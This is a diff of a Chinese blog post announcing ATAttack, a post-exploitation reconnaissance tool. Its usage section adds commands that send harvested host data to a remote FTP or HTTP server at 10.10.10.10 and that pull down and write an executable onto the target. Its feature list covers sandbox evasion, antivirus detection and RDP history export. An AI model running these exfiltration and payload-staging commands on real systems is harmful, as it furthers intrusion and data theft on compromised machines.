@@ -13,13 +13,14 @@
 <meta property="og:site_name" content="c1y2m3’blog">
 <meta property="og:description" content="前言​     ​ 每获取一台机器权限，如果每次都手动操作重复一样的信息收集工作，无疑加大了工作量，既为了能更好的获取内网进一步突破点攻击面,这段闲暇时间造了个简易的轮子，其在真实环境中发现较多未知问题，欢迎大家踊跃提交 issue 和 PR ！​      v1.0-开发进度：简介ATAttack是一款后渗透半自动化侦察工具，它从进攻性和防御性安全角度执行许多面向安全性的主机调查“安全检查”。">
 <meta property="og:locale" content="default">
+<meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5e1c398932f2ca5a1c43e852">
 <meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5dbe4d62b54c8d19b5579f55">
 <meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5dac6de090144e463b1d6194">
-<meta property="og:updated_time" content="2019-11-03T03:56:01.000Z">
+<meta property="og:updated_time" content="2020-02-13T03:41:38.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="基于后渗透自动化收集-ATAttack">
 <meta name="twitter:description" content="前言​     ​ 每获取一台机器权限，如果每次都手动操作重复一样的信息收集工作，无疑加大了工作量，既为了能更好的获取内网进一步突破点攻击面,这段闲暇时间造了个简易的轮子，其在真实环境中发现较多未知问题，欢迎大家踊跃提交 issue 和 PR ！​      v1.0-开发进度：简介ATAttack是一款后渗透半自动化侦察工具，它从进攻性和防御性安全角度执行许多面向安全性的主机调查“安全检查”。">
-<meta name="twitter:image" content="https://www.yunzhijia.com/microblog/filesvr/5dbe4d62b54c8d19b5579f55">
+<meta name="twitter:image" content="https://www.yunzhijia.com/microblog/filesvr/5e1c398932f2ca5a1c43e852">
     
     
         
@@ -143,13 +144,17 @@
   <div class="content" itemprop="articleBody">
     <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>​     ​ 每获取一台机器权限，如果每次都手动操作重复一样的信息收集工作，无疑加大了工作量，既为了能更好的获取内网进一步突破点攻击面,这段闲暇时间造了个简易的轮子，其在真实环境中发现较多未知问题，欢迎大家踊跃提交 issue 和 PR ！<br>​     </p>
 <h1 id="v1-0-开发进度："><a href="#v1-0-开发进度：" class="headerlink" title="v1.0-开发进度："></a>v1.0-开发进度：</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><strong>ATAttack</strong>是一款后渗透半自动化侦察工具，它从进攻性和防御性安全角度执行许多面向安全性的主机调查“安全检查”。</p>
-<p>项目地址：<a href="https://github.com/c1y2m3/ATAttack" target="_blank" rel="noopener">https://github.com/c1y2m3/ATAttack</a></p>
+<p>项目地址：<a href="https://github.com/c1y2m3/ATAttack" target="_blank" rel="noopener">https://github.com/c1y2m3/ATAttack</a><br><img src="https://www.yunzhijia.com/microblog/filesvr/5e1c398932f2ca5a1c43e852" alt=""></p>
 <h2 id="快照预览"><a href="#快照预览" class="headerlink" title="快照预览"></a>快照预览</h2><h2 id="win10测试环境"><a href="#win10测试环境" class="headerlink" title="win10测试环境"></a>win10测试环境</h2><p><img src="https://www.yunzhijia.com/microblog/filesvr/5dbe4d62b54c8d19b5579f55" alt=""></p>
 <h2 id="win2008测试环境："><a href="#win2008测试环境：" class="headerlink" title="win2008测试环境："></a>win2008测试环境：</h2><p><img src="https://www.yunzhijia.com/microblog/filesvr/5dac6de090144e463b1d6194" alt=""></p>
-<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><h2 id="cmd-exe"><a href="#cmd-exe" class="headerlink" title="cmd.exe"></a>cmd.exe</h2><p>存储于本地文件夹：</p>
+<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><h2 id="cmd-exe"><a href="#cmd-exe" class="headerlink" title="cmd.exe"></a>cmd.exe</h2><p>存储于本地临时文件夹：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python exploit.py</span><br></pre></td></tr></table></figure>
-<p>回传至远程FTP服务器：</p>
+<p>回传远程FTP服务器：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python exploit.py -t ftp_host -u ftp_user -p ftp_pwd</span><br></pre></td></tr></table></figure>
+<p>通过PUT请求回传http服务端</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python exploit.py -d http://10.10.10.10:8000/</span><br></pre></td></tr></table></figure>
+<p>HTTP分块传输落地可执行文件 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python http_client.py -d http://10.10.10.10./exploit.exe -u http://10.10.10.10:8000/</span><br></pre></td></tr></table></figure>
 <h2 id="一、基础信息获取："><a href="#一、基础信息获取：" class="headerlink" title="一、基础信息获取："></a>一、基础信息获取：</h2><p>1、系统驱动器信息获取，判断是否为沙箱环境，从而运行程序</p>
 <p>2、系统进程识别，判断是否存在杀软av进程，对其进行输出</p>
 <p>3、单机所有用户以及当前用户RDP远程连接导出 </p>
